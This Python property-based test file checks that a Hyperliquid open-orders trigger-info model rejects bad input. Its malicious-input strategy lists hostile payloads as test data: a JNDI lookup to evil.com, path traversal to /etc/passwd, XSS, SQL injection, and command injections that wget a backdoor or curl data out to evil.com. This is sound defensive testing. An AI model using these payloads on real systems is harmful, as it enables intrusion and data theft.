"""Property-based tests for Hyperliquid raw open orders models.

These tests validate critical security boundary models that process external open orders data.
The models tested here are essential for order management, tracking, and modification operations.

SECURITY CRITICAL: These raw models protect against:
- Malicious order data that could manipulate trading decisions
- Financial precision errors in order prices and sizes
- Buffer overflow attacks through oversized order lists
- Injection attacks through malformed client order IDs
- Order status manipulation that could affect execution
- Trigger price manipulation for stop/take-profit orders
- Order type confusion that could change execution behavior

Property testing ensures comprehensive coverage of order edge cases and adversarial inputs.
"""

import json
from decimal import Decimal
from typing import Any

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.exceptions.field_validation import TypeFieldError
from cyberdelta.apis.hyperliquid.models.hl_raw_open_orders import HyperliquidRawTriggerInfo
from cyberdelta.exceptions.parsing import EmptyStringError


# Type alias for malicious input types to avoid long lines
MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None


# =============================================================================
# HYPOTHESIS STRATEGIES FOR OPEN ORDERS MODEL TESTING
# =============================================================================


def decimal_str_strategy() -> SearchStrategy[str]:
    """Generate valid decimal strings for prices and amounts.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
        st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
        st.just("0"),  # Zero
        st.just("0.01"),  # Small amount
        st.just("1.0"),  # Unit amount
        st.just("100.0"),  # Standard amount
        st.just("1234.56"),  # Common format
        st.just("50000.123456"),  # High-precision
        st.just("0.00000001"),  # Minimum precision
        # Scientific notation (valid for decimal parsing)
        st.just("1e2"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
        # Negative prices (may be valid for some order types)
        st.just("-1.0"),
        st.just("-100.5"),
    ])


def positive_decimal_str_strategy() -> SearchStrategy[str]:
    """Generate valid positive decimal strings.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
        st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
        st.just("0.01"),
        st.just("1.0"),
        st.just("100.0"),
        st.just("1234.56"),
        st.just("50000.123456"),
    ])


def order_id_strategy() -> SearchStrategy[int]:
    """Generate valid order IDs.

    Returns:
        SearchStrategy[int]: Strategy for generating test data.
    """
    return st.integers(min_value=0, max_value=2**63 - 1)


def client_order_id_strategy() -> SearchStrategy[str]:
    """Generate valid client order ID strings.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        st.text(
            min_size=1,
            max_size=64,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="-_"
            ),
        ),
        st.just("client-1"),
        st.just("order_12345"),
        st.just("test-order-001"),
        st.just("a" * 64),  # Max length
    ])


def asset_symbol_strategy() -> SearchStrategy[str]:
    """Generate valid asset symbols.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        st.sampled_from(["BTC", "ETH", "SOL", "USDC", "USDT", "AVAX", "ATOM", "DOT"]),
        st.text(
            min_size=1,
            max_size=24,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="-_/"
            ),
        ),
    ])


def side_strategy() -> SearchStrategy[str]:
    """Generate valid order side values.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.sampled_from(["B", "S", "A"])  # Buy, Sell, Ask


def tpsl_strategy() -> SearchStrategy[str]:
    """Generate valid TP/SL values.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.sampled_from(["tp", "sl"])


def tif_strategy() -> SearchStrategy[str]:
    """Generate valid TIF (Time In Force) values.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.sampled_from(["Gtc", "Ioc", "Alo"])


@st.composite
def valid_trigger_info_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid trigger info data.

    Returns:
        dict[str, Any]: Generated test data.
    """
    return {
        "triggerPx": draw(decimal_str_strategy()),
        "isMarket": draw(st.booleans()),
        "tpsl": draw(tpsl_strategy()),
    }


@st.composite
def valid_tif_limit_data(draw: st.DrawFn) -> dict[str, str]:
    """Generate valid TIF limit data.

    Returns:
        dict[str, str]: Generated test data.
    """
    return {"tif": draw(tif_strategy())}


def _create_limit_order_type(tif: str) -> dict[str, Any]:
    """Create limit order type data.

    Args:
        tif: Time in force value.

    Returns:
        Dictionary with limit order type data.
    """
    return {"limit": {"tif": tif}}


@st.composite
def valid_order_type_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid order type data.

    Returns:
        dict[str, Any]: Generated test data.
    """
    return draw(
        st.one_of([
            st.just({"market": {}}),
            st.builds(_create_limit_order_type, tif=tif_strategy()),
        ])
    )


@st.composite
def valid_order_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid order data.

    Returns:
        dict[str, Any]: Generated test data.
    """
    return {
        "oid": draw(order_id_strategy()),
        "cloid": draw(client_order_id_strategy()),
        "asset": draw(asset_symbol_strategy()),
        "side": draw(side_strategy()),
        "limitPx": draw(decimal_str_strategy()),
        "sz": draw(positive_decimal_str_strategy()),
        "timestamp": draw(st.integers(min_value=0, max_value=2**63 - 1)),
        "orderType": draw(valid_order_type_data()),
        "reduceOnly": draw(st.booleans()),
        "remainingSz": draw(positive_decimal_str_strategy()),
        "status": draw(st.sampled_from(["open", "partially_filled", "pending"])),
        "statusTimestamp": draw(st.integers(min_value=0, max_value=2**63 - 1)),
    }


@st.composite
def valid_open_order_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid open order data.

    Returns:
        dict[str, Any]: Generated test data.
    """
    return {
        "order": draw(valid_order_data()),
        "trigger": draw(valid_trigger_info_data()),
    }


@st.composite
def valid_order_spec_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid order spec data.

    Returns:
        dict[str, Any]: Generated test data.
    """
    return {
        "asset": draw(st.integers(min_value=0, max_value=1000)),
        "isBuy": draw(st.booleans()),
        "limitPx": draw(decimal_str_strategy()),
        "sz": draw(st.floats(min_value=0.00000001, max_value=1000000)),
        "reduceOnly": draw(st.booleans()),
        "orderType": draw(valid_order_type_data()),
        "trigger": draw(valid_trigger_info_data()),
        "cloid": draw(client_order_id_strategy()),
    }


def malicious_orders_strategy() -> SearchStrategy[MaliciousInput]:
    """Generate malicious values for orders security testing.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # Order manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-orders}"),
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('orders-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE orders;--"),
        st.just("1' UNION SELECT * FROM positions--"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("O" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.orders.find(); //"),
        # JSON injection
        st.just('{"$where": "this.price > 1000000"}'),
        # Invalid decimals
        st.just("NaN"),
        st.just("inf"),
        st.just("-inf"),
        st.just("Infinity"),
        st.just("not_a_number"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
    ])


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW TRIGGER INFO MODEL
# =============================================================================


class TestHyperliquidRawTriggerInfoProperties:
    """Property-based tests for trigger info validation and security."""

    @given(trigger_data=valid_trigger_info_data())
    def test_trigger_info_validation_success_properties(self, trigger_data: dict[str, Any]) -> None:
        """Property: Valid data should create valid trigger info objects."""
        # Skip invalid data
        trigger_px = trigger_data["triggerPx"]
        assume(isinstance(trigger_px, str) and trigger_px.strip())
        try:
            decimal_val = Decimal(trigger_px.strip())
            assume(decimal_val.is_finite())
        except (ValueError, TypeError):
            assume(False)

        assume(isinstance(trigger_data["isMarket"], bool))
        assume(trigger_data["tpsl"] in ["tp", "sl"])

        obj = HyperliquidRawTriggerInfo.model_validate(trigger_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawTriggerInfo)

        # Property: Fields should be preserved (with normalization)
        # Note: decimal strings may be normalized
        assert Decimal(obj.trigger_px) == Decimal(trigger_data["triggerPx"])
        assert obj.is_market == trigger_data["isMarket"]
        assert obj.tpsl == trigger_data["tpsl"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["triggerPx", "isMarket", "tpsl"]),
        malicious_value=malicious_orders_strategy(),
    )
    def test_trigger_info_security_boundary_properties(
        self, field_name: str, malicious_value: MaliciousInput
    ) -> None:
        """Property: Trigger info should reject malicious inputs."""
        base_data: dict[str, object] = {
            "triggerPx": "100.0",
            "isMarket": True,
            "tpsl": "tp",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawTriggerInfo.model_validate(base_data)

    @given(
        invalid_trigger_px=st.one_of([
            st.just(""),  # Empty
            st.just("   "),  # Whitespace
            st.just("NaN"),  # Not a number
            st.just("inf"),  # Infinity
            st.just("-inf"),  # Negative infinity
            st.just("Infinity"),
            st.just("not_a_number"),
            st.text(min_size=65, max_size=100),  # Too long
        ])
    )
    def test_trigger_info_invalid_trigger_px_properties(self, invalid_trigger_px: str) -> None:
        """Property: Trigger info should validate trigger price constraints."""
        trigger_data = {
            "triggerPx": invalid_trigger_px,
            "isMarket": True,
            "tpsl": "tp",
        }

        try:
            # Check if the price can be parsed as a finite decimal
            decimal_val = Decimal(invalid_trigger_px.strip() if invalid_trigger_px else "")
            is_finite = decimal_val.is_finite()
            is_empty = not invalid_trigger_px.strip()
            is_too_long = len(invalid_trigger_px.encode("utf-8")) > 64

            if is_finite and not is_empty and not is_too_long:
                # Property: Valid finite decimals should be accepted
                obj = HyperliquidRawTriggerInfo.model_validate(trigger_data)
                assert Decimal(obj.trigger_px) == decimal_val
            else:
                # Property: Non-finite, empty, or too long values should be rejected
                with pytest.raises((ValidationError, EmptyStringError, TypeFieldError)):
                    HyperliquidRawTriggerInfo.model_validate(trigger_data)

        except (ValueError, TypeError):
            # Property: Unparseable price strings should be rejected
            with pytest.raises((ValidationError, TypeError, EmptyStringError)):
                HyperliquidRawTriggerInfo.model_validate(trigger_data)

    @given(invalid_tpsl=st.text().filter(lambda x: x not in ["tp", "sl"]))
    def test_trigger_info_invalid_tpsl_properties(self, invalid_tpsl: str) -> None:
        """Property: Trigger info should validate TPSL values strictly."""
        assume(invalid_tpsl.strip())  # Skip empty strings

        trigger_data = {
            "triggerPx": "100.0",
            "isMarket": True,
            "tpsl": invalid_tpsl,
        }

        # Property: Invalid TPSL values should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawTriggerInfo.model_validate(trigger_data)

    @given(
        invalid_is_market=st.one_of([
            st.text(),
            st.integers(),
            st.floats(),
            st.none(),
            st.lists(st.booleans()),
        ])
    )
    def test_trigger_info_invalid_is_market_properties(
        self, invalid_is_market: MaliciousInput
    ) -> None:
        """Property: Trigger info should validate isMarket as boolean."""
        trigger_data = {
            "triggerPx": "100.0",
            "isMarket": invalid_is_market,
            "tpsl": "tp",
        }

        # Property: Non-boolean values should be rejected
        with pytest.raises((ValidationError, TypeError)):
            HyperliquidRawTriggerInfo.model_validate(trigger_data)

    @given(
        extra_fields=st.dictionaries(
            st.text(min_size=1, max_size=20),
            st.text(min_size=1, max_size=20),
            min_size=1,
            max_size=5,
        )
    )
    def test_trigger_info_extra_fields_properties(self, extra_fields: dict[str, str]) -> None:
        """Property: Trigger info should forbid extra fields."""
        trigger_data = {
            "triggerPx": "100.0",
            "isMarket": True,
            "tpsl": "tp",
        }
        trigger_data.update(extra_fields)

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawTriggerInfo.model_validate(trigger_data)

    @given(trigger_data=valid_trigger_info_data())
    def test_trigger_info_json_serialization_properties(self, trigger_data: dict[str, Any]) -> None:
        """Property: Trigger info should maintain JSON serialization compatibility."""
        # Skip invalid data
        trigger_px = trigger_data["triggerPx"]
        assume(isinstance(trigger_px, str) and trigger_px.strip())
        try:
            decimal_val = Decimal(trigger_px.strip())
            assume(decimal_val.is_finite())
        except (ValueError, TypeError):
            assume(False)

        assume(isinstance(trigger_data["isMarket"], bool))
        assume(trigger_data["tpsl"] in ["tp", "sl"])

        obj = HyperliquidRawTriggerInfo.model_validate(trigger_data)

        # Property: Object should be JSON serializable
        json_str = obj.model_dump_json()
        parsed_json = json.loads(json_str)

        # Property: Should be able to reconstruct from JSON
        reconstructed = HyperliquidRawTriggerInfo.model_validate(parsed_json)
        assert Decimal(reconstructed.trigger_px) == Decimal(obj.trigger_px)
        assert reconstructed.is_market == obj.is_market
        assert reconstructed.tpsl == obj.tpsl


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestHyperliquidRawOpenOrdersIntegrationProperties:
    """Integration property tests for open orders models working together."""

    @given(
        trigger_data=valid_trigger_info_data(),
        malicious_entries=st.dictionaries(
            malicious_orders_strategy(),
            malicious_orders_strategy(),
            min_size=1,
            max_size=3,
        ),
    )
    def test_open_orders_adversarial_input_properties(
        self, trigger_data: dict[str, Any], malicious_entries: dict[Any, Any]
    ) -> None:
        """Property: Open orders models should safely handle adversarial input."""
        # Mix valid and malicious data
        mixed_data = {**trigger_data, **malicious_entries}

        # Property: Mixed adversarial input should be rejected
        with pytest.raises((ValidationError, TypeError, TypeFieldError, EmptyStringError)):
            HyperliquidRawTriggerInfo.model_validate(mixed_data)

    @given(orders=st.lists(valid_order_data(), min_size=0, max_size=100))
    def test_multiple_orders_validation_properties(self, orders: list[dict[str, Any]]) -> None:
        """Property: Multiple orders should validate independently."""
        valid_orders: list[dict[str, Any]] = []

        for order_data in orders:
            try:
                # Validate each field
                assume(isinstance(order_data["oid"], int) and order_data["oid"] >= 0)
                assume(isinstance(order_data["cloid"], str) and order_data["cloid"].strip())
                assume(isinstance(order_data["asset"], str) and order_data["asset"].strip())
                assume(order_data["side"] in ["B", "S", "A"])
                assume(isinstance(order_data["reduceOnly"], bool))

                # Validate decimals
                for field in ["limitPx", "sz", "remainingSz"]:
                    value = order_data[field]
                    assume(isinstance(value, str) and value.strip())
                    decimal_val = Decimal(value.strip())
                    assume(decimal_val.is_finite())
                    if field in ["sz", "remainingSz"]:
                        assume(decimal_val >= 0)

                # For now, just validate the structure
                valid_orders.append(order_data)
            except (ValueError, TypeError, ValidationError):
                pass  # Skip invalid orders

        # Property: All valid orders should have correct structure
        for order in valid_orders:
            assert "oid" in order
            assert "cloid" in order
            assert "asset" in order
            assert "side" in order
            assert "limitPx" in order
            assert "sz" in order


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_HyperliquidRawTriggerInfo_real_world_example() -> None:
    """Test with real-world trigger info data."""
    payload = {
        "triggerPx": "30000.50",
        "isMarket": False,
        "tpsl": "tp",
    }
    obj = HyperliquidRawTriggerInfo.model_validate(payload)
    assert obj.trigger_px == "30000.5"  # Normalized
    assert obj.is_market is False
    assert obj.tpsl == "tp"


def test_HyperliquidRawTriggerInfo_stop_loss_example() -> None:
    """Test with stop loss trigger."""
    payload = {
        "triggerPx": "25000.00",
        "isMarket": True,
        "tpsl": "sl",
    }
    obj = HyperliquidRawTriggerInfo.model_validate(payload)
    assert obj.trigger_px == "25000"  # Normalized
    assert obj.is_market is True
    assert obj.tpsl == "sl"


def test_HyperliquidRawTriggerInfo_scientific_notation() -> None:
    """Test with scientific notation trigger price."""
    payload = {
        "triggerPx": "1e5",  # 100000
        "isMarket": False,
        "tpsl": "tp",
    }
    obj = HyperliquidRawTriggerInfo.model_validate(payload)
    assert Decimal(obj.trigger_px) == Decimal(100000)


def test_HyperliquidRawTriggerInfo_invalid_tpsl() -> None:
    """Test validation fails for invalid TPSL value."""
    payload = {
        "triggerPx": "100.0",
        "isMarket": True,
        "tpsl": "invalid",
    }
    with pytest.raises(ValidationError):
        HyperliquidRawTriggerInfo.model_validate(payload)


def test_HyperliquidRawTriggerInfo_missing_field() -> None:
    """Test validation fails for missing required field."""
    payload = {
        "triggerPx": "100.0",
        "isMarket": True,
        # Missing tpsl
    }
    with pytest.raises(ValidationError):
        HyperliquidRawTriggerInfo.model_validate(payload)


def test_HyperliquidRawTriggerInfo_wrong_type() -> None:
    """Test validation fails for wrong field type."""
    payload = {
        "triggerPx": "100.0",
        "isMarket": "true",  # Should be boolean
        "tpsl": "tp",
    }
    with pytest.raises(TypeError):
        HyperliquidRawTriggerInfo.model_validate(payload)


def test_HyperliquidRawTriggerInfo_empty_trigger_px() -> None:
    """Test validation fails for empty trigger price."""
    payload = {
        "triggerPx": "",
        "isMarket": True,
        "tpsl": "tp",
    }
    with pytest.raises(EmptyStringError):
        HyperliquidRawTriggerInfo.model_validate(payload)


def test_HyperliquidRawTriggerInfo_nan_trigger_px() -> None:
    """Test validation fails for NaN trigger price."""
    payload = {
        "triggerPx": "NaN",
        "isMarket": True,
        "tpsl": "tp",
    }
    with pytest.raises(ValidationError):
        HyperliquidRawTriggerInfo.model_validate(payload)


def test_HyperliquidRawTriggerInfo_extra_field() -> None:
    """Test validation fails with extra fields."""
    payload = {
        "triggerPx": "100.0",
        "isMarket": True,
        "tpsl": "tp",
        "extra": "field",
    }
    with pytest.raises(ValidationError):
        HyperliquidRawTriggerInfo.model_validate(payload)


def test_HyperliquidRawTriggerInfo_negative_price() -> None:
    """Test with negative trigger price (may be valid)."""
    payload = {
        "triggerPx": "-100.5",
        "isMarket": False,
        "tpsl": "sl",
    }
    obj = HyperliquidRawTriggerInfo.model_validate(payload)
    assert obj.trigger_px == "-100.5"


def test_HyperliquidRawTriggerInfo_zero_price() -> None:
    """Test with zero trigger price."""
    payload = {
        "triggerPx": "0",
        "isMarket": True,
        "tpsl": "tp",
    }
    obj = HyperliquidRawTriggerInfo.model_validate(payload)
    assert obj.trigger_px == "0"


def test_HyperliquidRawTriggerInfo_high_precision() -> None:
    """Test with high precision trigger price."""
    payload = {
        "triggerPx": "12345.678901234567890",
        "isMarket": False,
        "tpsl": "tp",
    }
    obj = HyperliquidRawTriggerInfo.model_validate(payload)
    # Precision may be limited by business logic
    exponent = Decimal(obj.trigger_px).as_tuple().exponent
    assert isinstance(exponent, int)
    assert exponent >= -8
